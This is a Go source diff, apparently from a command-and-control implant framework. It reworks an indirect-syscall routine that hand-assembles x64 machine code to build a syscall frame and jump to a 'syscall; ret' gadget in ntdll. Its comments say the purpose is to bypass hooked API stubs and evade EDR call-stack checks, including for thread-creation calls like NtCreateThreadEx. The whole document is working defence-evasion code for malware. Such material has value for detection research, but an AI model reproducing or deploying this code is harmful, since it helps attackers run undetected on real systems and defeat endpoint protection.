@@ -259,32 +259,38 @@ func buildIndirectSyscallStub(ssn uint16, gadgetAddr uintptr) []byte {
 	return stub
 }
 
-// IndirectSyscall executes a syscall indirectly by:
-//  1. Loading the SSN into eax
-//  2. Jumping to a clean `syscall; ret` gadget in ntdll
+// IndirectSyscall executes a syscall indirectly via a self-contained
+// argument-marshalling stub:
+//
+//	The stub builds the full x64 syscall frame on the stack (return address,
+//	32-byte shadow space, stack args 5..N), loads arg1..arg4 into
+//	r10/rdx/r8/r9 as immediates, sets eax=SSN, and jumps to a clean
+//	`syscall; ret` gadget in ntdll.
 //
 // This avoids calling through hooked stubs while still executing the actual
 // syscall instruction from ntdll's .text section (which is typically
-// whitelisted by EDR call-stack verification).
-//
-// args are the syscall arguments in order (mapped to rcx, rdx, r8, r9, stack).
-// The first argument is moved to r10 by the trampoline (Windows syscall ABI).
+// whitelisted by EDR call-stack verification), and — unlike the previous
+// syscall.Syscall6 trampoline — supports up to 10 arguments (NtCreateThread
+// takes 8, NtCreateThreadEx takes 10). All argument values are baked into
+// the stub as immediates, so nothing leaks through the Go call frame.
 func IndirectSyscall(ssn uint16, gadgetAddr uintptr, args ...uintptr) error {
 	if gadgetAddr == 0 {
 		return errors.New("invalid gadget address")
+	}
+	if len(args) > 10 {
+		return fmt.Errorf("indirect syscall: %d args exceeds maximum of 10", len(args))
 	}
 
 	//{{if .Config.Debug}}
 	log.Printf("[IndirectSyscall] ssn=%d gadget=0x%08x argc=%d\n", ssn, gadgetAddr, len(args))
 	//{{end}}
 
-	// Build the trampoline shellcode
-	stub := buildIndirectSyscallStub(ssn, gadgetAddr)
+	stub := buildFrameStub(ssn, gadgetAddr, args)
 
-	// Allocate executable memory for the trampoline
+	// Allocate RW memory, write the stub, flip to RX.
 	stubAddr, err := windows.VirtualAlloc(
 		0,
-		uintptr(len(stub)),
+		uintptr(len(stub.bytes)),
 		windows.MEM_COMMIT|windows.MEM_RESERVE,
 		windows.PAGE_READWRITE,
 	)
@@ -292,52 +298,124 @@ func IndirectSyscall(ssn uint16, gadgetAddr uintptr, args ...uintptr) error {
 		return err
 	}
 	if stubAddr == 0 {
-		return errors.New("VirtualAlloc failed for indirect syscall trampoline")
+		return errors.New("VirtualAlloc failed for indirect syscall stub")
 	}
 	defer windows.VirtualFree(stubAddr, 0, windows.MEM_RELEASE)
 
-	// Write the trampoline bytes
-	for i, b := range stub {
+	// Patch the absolute epilogue address (known only after allocation).
+	binary.LittleEndian.PutUint64(
+		stub.bytes[stub.epilogueImmOffset:stub.epilogueImmOffset+8],
+		uint64(stubAddr+uintptr(stub.epilogueOffset)),
+	)
+
+	for i, b := range stub.bytes {
 		*(*byte)(unsafe.Pointer(stubAddr + uintptr(i))) = b
 	}
-
-	// Flip protection to executable
 	var oldProtect uint32
-	err = windows.VirtualProtect(stubAddr, uintptr(len(stub)), windows.PAGE_EXECUTE_READ, &oldProtect)
-	if err != nil {
+	if err := windows.VirtualProtect(stubAddr, uintptr(len(stub.bytes)), windows.PAGE_EXECUTE_READ, &oldProtect); err != nil {
 		return err
 	}
 
-	// Execute the trampoline via Syscall6.
-	// On amd64 Windows: rcx(->r10 by trampoline), rdx, r8, r9, stack...
-	var ret uintptr
-	switch len(args) {
-	case 0:
-		ret, _, _ = syscall.Syscall6(stubAddr, 6, 0, 0, 0, 0, 0, 0)
-	case 1:
-		ret, _, _ = syscall.Syscall6(stubAddr, 6, args[0], 0, 0, 0, 0, 0)
-	case 2:
-		ret, _, _ = syscall.Syscall6(stubAddr, 6, args[0], args[1], 0, 0, 0, 0)
-	case 3:
-		ret, _, _ = syscall.Syscall6(stubAddr, 6, args[0], args[1], args[2], 0, 0, 0)
-	case 4:
-		ret, _, _ = syscall.Syscall6(stubAddr, 6, args[0], args[1], args[2], args[3], 0, 0)
-	case 5:
-		ret, _, _ = syscall.Syscall6(stubAddr, 6, args[0], args[1], args[2], args[3], args[4], 0)
-	default:
-		ret, _, _ = syscall.Syscall6(stubAddr, 6, args[0], args[1], args[2], args[3], args[4], args[5])
-		//{{if .Config.Debug}}
-		log.Printf("[IndirectSyscall] warning: more than 6 args not fully supported, truncated\n")
-		//{{end}}
-	}
+	// Call the stub. It marshals its own arguments (immediates) and returns
+	// the NTSTATUS in rax, which syscall.Syscall surfaces as r1.
+	ret, _, _ := syscall.Syscall(stubAddr, 0, 0, 0, 0)
 
 	//{{if .Config.Debug}}
 	log.Printf("[IndirectSyscall] returned 0x%08x\n", ret)
 	//{{end}}
 
-	// Check NTSTATUS: 0 = STATUS_SUCCESS, anything else is an error
 	if ret != 0 {
 		return fmt.Errorf("indirect syscall failed with NTSTATUS 0x%08x", ret)
 	}
 	return nil
+}
+
+// buildFrameStub assembles the argument-marshalling trampoline.
+//
+// Frame layout at the moment the gadget's `syscall` executes:
+//
+//	[rsp+0x00]  return address → local epilogue
+//	[rsp+0x08]  shadow space (32 bytes, callee-owned per x64 ABI)
+//	[rsp+0x28]  arg5
+//	[rsp+0x30]  arg6
+//	[rsp+0x38]  arg7
+//	[rsp+0x40]  arg8
+//	[rsp+0x48]  arg9
+//	[rsp+0x50]  arg10
+//
+// Registers at syscall time: r10=arg1, rdx=arg2, r8=arg3, r9=arg4, eax=SSN
+// (Windows x64 syscall ABI moves the first register arg to r10 because the
+// syscall instruction clobbers rcx).
+// frameStub is an assembled argument-marshalling trampoline plus the patch
+// points IndirectSyscall needs to resolve after allocation.
+type frameStub struct {
+	bytes              []byte
+	epilogueOffset     int // offset of the epilogue (add rsp, frameSize; ret)
+	epilogueImmOffset  int // offset of the imm64 slot holding the epilogue address
+}
+
+func buildFrameStub(ssn uint16, gadgetAddr uintptr, args []uintptr) frameStub {
+	const (
+		maxStackArgs = 6                    // args 5..10
+		frameSize    = 0x28 + 8*maxStackArgs // retaddr + shadow + 6 stack slots = 0x58
+	)
+
+	stub := make([]byte, 0, 128)
+	put := func(bs ...byte) { stub = append(stub, bs...) }
+	// mov rax, imm64 (placeholder for epilogue address, patched after alloc)
+	epilogueMovAt := len(stub)
+	put(0x48, 0xB8)
+	put(0, 0, 0, 0, 0, 0, 0, 0)
+	// sub rsp, frameSize
+	put(0x48, 0x83, 0xEC, frameSize)
+	// mov [rsp], rax  (return address → epilogue)
+	put(0x48, 0x89, 0x04, 0x24)
+	// Stack args 5..10, written high-to-low so a single scratch register works
+	for i := maxStackArgs - 1; i >= 0; i-- {
+		var v uintptr
+		if len(args) >= 5+i {
+			v = args[4+i]
+		}
+		// mov rax, imm64
+		put(0x48, 0xB8)
+		for b := 0; b < 8; b++ {
+			put(byte(v >> (uint(b) * 8)))
+		}
+		// mov [rsp+disp8], rax  (disp = 0x28 + 8*i)
+		put(0x48, 0x89, 0x44, 0x24, byte(0x28+8*i))
+	}
+	// Register args 1..4 as immediates
+	regArgs := [4][2]byte{
+		{0x49, 0xBA}, // mov r10, imm64 (arg1)
+		{0x48, 0xBA}, // mov rdx, imm64 (arg2)
+		{0x49, 0xB8}, // mov r8, imm64  (arg3)
+		{0x49, 0xB9}, // mov r9, imm64  (arg4)
+	}
+	for i, op := range regArgs {
+		var v uintptr
+		if len(args) > i {
+			v = args[i]
+		}
+		put(op[0], op[1])
+		for b := 0; b < 8; b++ {
+			put(byte(v >> (uint(b) * 8)))
+		}
+	}
+	// mov eax, SSN
+	put(0xB8, byte(ssn), byte(ssn>>8), 0x00, 0x00)
+	// jmp [rip+0] → gadget address follows
+	put(0xFF, 0x25, 0x00, 0x00, 0x00, 0x00)
+	for b := 0; b < 8; b++ {
+		put(byte(gadgetAddr >> (uint(b) * 8)))
+	}
+	// epilogue: add rsp, frameSize ; ret
+	epilogueAt := len(stub)
+	put(0x48, 0x83, 0xC4, frameSize)
+	put(0xC3)
+
+	return frameStub{
+		bytes:             stub,
+		epilogueOffset:    epilogueAt,
+		epilogueImmOffset: epilogueMovAt + 2,
+	}
 }
